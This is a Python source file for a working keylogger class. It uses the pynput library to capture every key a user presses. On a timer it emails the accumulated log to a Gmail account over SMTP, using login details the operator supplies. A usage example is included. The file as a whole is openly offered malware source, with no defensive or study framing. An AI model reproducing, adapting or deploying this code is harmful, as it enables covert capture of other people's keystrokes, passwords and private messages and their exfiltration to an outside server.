import pynput.keyboard as keyrec
import threading
import smtplib as smt
import time

class Keylogger:
    '''Args:
    @1: Time interval in seconds(s)
    @2: Your email with which you want to login and send the keylogger report to as string
    @3: The password to access your google account thus your gmail to send the report as string
        Your password needs to be the one added to 'App Password' in your Google Account Security
        tab otherwise it won't work
    
    Example = keylogger.Keylogger(60, 'myemail@gmail.com', '12345678')'''

    def __init__(self, time_interval, email, password):
        self.time_interval = time_interval
        self.email = email
        self.password = password
        self.log = 'KeyLogger started...'

    def process(self,key):
        '''Callback function that processes the key pressed and puts them in a rather awful format

        Ignores all this characters:
            [à, é, é, ì, ò, ù, §, °, ç, £, €], as they can't be encoded in ASCII code and
            therefore not sent by smtplib module via email
            
            It replaces them with (g) that stands for 'guess' between those characters'''

        forbiddenchars = ['\'ò\'', '\'à\'', '\'è\'', '\'ù\'', '\'§\'', '\'°\'', '\'ç\'', '\'é\'', '\'£\'', '\'€\'', '\'ì\'']
        if any(str(key) == x for x in forbiddenchars):
            self.log += '(g)'
        else:
            try:
                    self.log += str(key.char)
            except AttributeError:
                if str(key) == 'Key.space':
                    self.log += ' '
                else:
                    self.log += ' ' + str(key) + ' '

    def sendmail(self):
        server = smt.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, self.log)
        server.quit()

    def report(self):
        print(self.log)
        if self.log != '' and self.log != 'KeyLogger started...\n\n':
            self.sendmail()
            self.log = ''
        else:pass
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()
        #This code under this line is a timer countdown for debugging
        # n = self.time_interval
        # while n != 0:
        #     print(n)
        #     time.sleep(1)
        #     n -= 1

    def start(self):
        rec = keyrec.Listener(on_press=self.process)
        with rec:
            self.report()
            rec.join()
